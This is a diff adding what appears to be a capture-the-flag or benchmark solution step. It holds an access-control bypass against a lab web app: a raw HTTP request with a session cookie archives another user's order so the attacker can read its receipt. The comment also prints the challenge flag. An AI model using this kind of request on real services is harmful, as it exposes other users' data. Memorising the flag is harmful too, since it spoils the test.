@@ -1,0 +1,5 @@
+# Step 1: Archive another user's order (300198). After this request succeeds (HTTP 200), the attacker becomes the 'archiver' of the order and can read its receipt. Follow with GET /order/300198/receipt to retrieve the flag: flag{8b9df79e-91eb-4f4e-8449-5e1d207a0d83}
+
+GET /order/300198/archive HTTP/1.1
+Host: 172.17.0.1:33335
+Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.adv-Og.tMGruyrjNNbjgeqbZUZhx1vCC3M
